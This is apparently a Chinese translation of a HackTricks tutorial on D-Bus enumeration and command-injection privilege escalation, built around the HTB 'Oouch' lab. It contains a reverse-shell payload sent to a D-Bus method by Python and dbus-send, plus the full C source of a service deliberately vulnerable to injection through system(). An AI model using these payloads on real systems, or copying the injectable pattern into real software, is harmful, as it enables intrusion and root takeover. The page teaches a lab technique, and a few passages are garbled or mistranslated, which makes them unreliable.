# D-Bus枚举和命令注入提权

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## **GUI枚举**

**(此枚举信息来自** [**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**)**

Ubuntu桌面使用D-Bus作为其进程间通信（IPC）中介。在Ubuntu上，有几个同时运行的消息总线：系统总线主要由**特权服务用于公开系统范围的相关服务**，每个登录用户都有一个会话总线，它公开仅对该特定用户相关的服务。由于我们将尝试提升权限，我们主要关注系统总线，因为那里的服务往往以更高的权限（即root）运行。请注意，D-Bus架构在每个会话总线上使用一个“路由器”，它将客户端消息重定向到它们尝试与之交互的相关服务。客户端需要指定要发送消息的服务的地址。

每个服务由其公开的**对象**和**接口**定义。我们可以将对象视为标准面向对象编程语言中的类的实例。每个唯一实例由其**对象路径**标识 - 这是一个类似于文件系统路径的字符串，唯一标识服务公开的每个对象。一个对我们研究有帮助的标准接口是**org.freedesktop.DBus.Introspectable**接口。它包含一个方法Introspect，该方法返回对象支持的方法、信号和属性的XML表示。本博文重点介绍方法，忽略属性和信号。

我使用了两个工具与D-Bus接口进行通信：一个名为**gdbus**的CLI工具，它允许在脚本中轻松调用D-Bus公开的方法，以及[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)，一个基于Python的GUI工具，用于枚举每个总线上可用的服务并查看每个服务包含的对象。
```bash
sudo apt-get install d-feet
```
![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

_图1. D-Feet主窗口_

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

_图2. D-Feet界面窗口_

在图1的左窗格中，您可以看到所有已注册到D-Bus守护进程系统总线的各种服务（请注意顶部的选择系统总线按钮）。我选择了**org.debin.apt**服务，并且D-Feet自动**查询了该服务的所有可用对象**。一旦我选择了特定的对象，所有接口及其相应的方法、属性和信号集将被列出，如图2所示。请注意，我们还可以获得每个**IPC公开方法**的签名。

我们还可以看到托管每个服务的进程的**pid**，以及其**命令行**。这是一个非常有用的功能，因为我们可以验证我们正在检查的目标服务确实以更高的权限运行。系统总线上的一些服务不以root身份运行，因此对研究来说不太有趣。

D-Feet还允许调用各种方法。在方法输入屏幕中，我们可以指定由逗号分隔的Python表达式列表，作为要解释为调用函数的参数，如图3所示。Python类型被编组为D-Bus类型并传递给服务。

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-23.png)

_图3. 通过D-Feet调用D-Bus方法_

某些方法在允许我们调用它们之前需要进行身份验证。我们将忽略这些方法，因为我们的目标是在没有凭据的情况下提升权限。

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-24.png)

_图4. 需要授权的方法_

还要注意，一些服务会查询另一个名为org.freedeskto.PolicyKit1的D-Bus服务，以确定是否允许用户执行某些操作。

## **命令行枚举**

### 列出服务对象

可以使用以下命令列出已打开的D-Bus接口：
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### 连接

当一个进程建立与总线的连接时，总线会为该连接分配一个特殊的总线名称，称为“唯一连接名称”。这种类型的总线名称是不可变的——只要连接存在，它们保证不会改变——更重要的是，在总线的生命周期内，它们不能被重复使用。这意味着，即使同一个进程关闭与总线的连接并创建一个新的连接，也不会有其他连接被分配到这样的唯一连接名称。唯一连接名称很容易识别，因为它们以否则禁止的冒号字符开头。

### 服务对象信息

然后，您可以通过以下方式获取有关接口的一些信息：
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### 列出服务对象的接口

您需要拥有足够的权限。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### 查看服务对象的Introspect接口

请注意，在此示例中，使用`tree`参数选择了最新发现的接口（请参见前一节）。
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
请注意接口`htb.oouch.Block`的方法`.Block`（我们感兴趣的方法）。其他列的"s"可能表示它期望一个字符串。

### 监视/捕获接口

如果拥有足够的权限（仅具有`send_destination`和`receive_sender`权限是不够的），您可以**监视D-Bus通信**。

为了**监视**一个**通信**，您需要成为**root用户**。如果您仍然遇到成为root用户的问题，请查看[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/)和[https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
如果您知道如何配置D-Bus配置文件以**允许非root用户嗅探**通信，请**与我联系**！
{% endhint %}

监视的不同方式：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
在下面的示例中，监视接口`htb.oouch.Block`并通过误传发送了消息"lalalalal"：
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
你可以使用`capture`而不是`monitor`将结果保存在一个pcap文件中。

#### 过滤所有噪音 <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

如果总线上有太多的信息，可以传递一个匹配规则，如下所示：
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
可以指定多个规则。如果消息与任何规则匹配，将打印该消息。如下所示：
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
请参阅[D-Bus文档](http://dbus.freedesktop.org/doc/dbus-specification.html)以获取有关匹配规则语法的更多信息。

### 更多

`busctl`还有更多选项，[**在这里找到所有选项**](https://www.freedesktop.org/software/systemd/man/busctl.html)。

## **易受攻击的场景**

作为HTB中主机"oouch"内的用户**qtc**，您可以在`/etc/dbus-1/system.d/htb.oouch.Block.conf`中找到一个**意外的D-Bus配置文件**：
```markup
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
注意前面的配置，**你需要成为用户`root`或`www-data`才能通过D-BUS通信发送和接收信息**。

作为docker容器**aeb4525789d8**中的用户**qtc**，你可以在文件_/code/oouch/routes.py_中找到一些与dbus相关的代码。以下是有趣的代码：
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
正如你所看到的，它正在**连接到一个D-Bus接口**，并将"client\_ip"发送给**"Block"函数**。

在D-Bus连接的另一端，有一个正在运行的C编译二进制文件。这段代码正在D-Bus连接中**监听IP地址，并通过`system`函数调用iptables来阻止给定的IP地址**。\
**故意使`system`调用存在命令注入漏洞**，因此像下面这样的有效载荷将创建一个反向shell：`;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### 利用它

在本页的末尾，你可以找到D-Bus应用程序的**完整C代码**。在其中的第91-97行之间，你可以找到**如何注册`D-Bus对象路径`和`接口名称`**的信息。这些信息将在发送信息到D-Bus连接时需要使用：
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
此外，在第57行中，您可以发现此D-Bus通信**仅注册了一种方法**，称为`Block`（_**这就是为什么在下一节中，负载将被发送到服务对象`htb.oouch.Block`，接口`/htb/oouch/Block`和方法名`Block`**_）：
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下Python代码将通过D-Bus连接将有效载荷发送到`Block`方法，通过`block_iface.Block(runme)`（_请注意，它是从之前的代码块中提取的_）：
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl和dbus-send

`busctl` is a command-line utility that allows you to introspect and interact with the D-Bus system bus. It provides a way to enumerate the available services, objects, and interfaces on the bus, as well as invoke methods and retrieve properties.

`dbus-send` is another command-line utility that allows you to send messages to the D-Bus bus. It can be used to invoke methods on remote objects, as well as set and get properties.

Both `busctl` and `dbus-send` are powerful tools for D-Bus enumeration and command injection privilege escalation. They can be used to discover vulnerable services, interact with them, and potentially exploit security weaknesses to escalate privileges.
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send`是一个用于向“消息总线”发送消息的工具。
* 消息总线 - 一种用于系统之间轻松通信的软件。它与消息队列相关（消息按顺序排列），但在消息总线中，消息以订阅模式发送，并且非常快速。
* “-system”标签用于指示这是一条系统消息，而不是会话消息（默认情况下）。
* “--print-reply”标签用于以人类可读的格式打印我们的消息，并接收任何回复。
* “--dest=Dbus-Interface-Block”是Dbus接口的地址。
* “--string:” - 我们想要发送到接口的消息类型。发送消息有几种格式，如double、bytes、booleans、int、objpath。在这些格式中，“对象路径”在我们想要将文件路径发送到Dbus接口时非常有用。在这种情况下，我们可以使用一个特殊文件（FIFO）来将命令传递给接口，以文件的名称进行命令传递。 “string:;” - 这是再次调用对象路径的方式，我们在其中放置了FIFO反向shell文件/命令。

_请注意，在`htb.oouch.Block.Block`中，第一部分（`htb.oouch.Block`）引用了服务对象，而最后一部分（`.Block`）引用了方法名称。_

### C代码

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者你想要获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>
